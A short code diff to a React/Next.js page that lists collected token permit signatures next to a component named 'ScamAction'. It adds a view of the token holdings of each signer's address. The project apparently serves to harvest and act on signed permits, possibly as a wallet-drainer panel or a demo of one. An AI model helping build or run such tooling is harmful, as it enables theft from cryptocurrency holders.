@@ -3,6 +3,7 @@ import {PermitSignature} from "@prisma/client";
 import {createPermitSignature} from "@/app/page";
 import React from "react";
 import ScamAction from "@/app/scam/ScamAction";
+import TokenList from "@/app/TokenList";
 
 export type SignedPermitSignature = Awaited<ReturnType<typeof createPermitSignature>>
 
@@ -21,6 +22,7 @@ const Page = async () => {
 							<textarea readOnly value={JSON.stringify(data,null,2)} className={'w-full p-2 rounded min-h-[350px] bg-black text-green-600'}></textarea>
 						</div>
 						<ScamAction data={data}  />
+						<TokenList address={data.permit.owner} CHAIN_ID={1} />
 					</details>
 				)
 			})}
